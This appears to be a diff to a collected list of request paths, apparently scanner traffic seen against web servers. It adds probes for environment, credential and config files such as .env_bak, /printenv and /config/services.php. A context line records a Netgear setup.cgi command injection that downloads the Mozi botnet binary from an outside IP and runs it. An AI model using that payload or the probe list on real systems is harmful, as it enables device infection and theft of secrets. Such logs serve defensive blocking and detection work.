@@ -17332,3 +17332,14 @@ pro.ip-api.com:443
 /figs-loso-gold-figs-30-50-cm?tag=30&page=8
 /.aws/credentials/.aws/config
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.113.207.215:39929/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+/public/_debugbar/
+/.env_bak
+/config/services.php
+/environment
+/env.list
+/.ghc.environment
+/.env-example
+/startup.sh
+/docker_run.sh
+/envrc
+/printenv
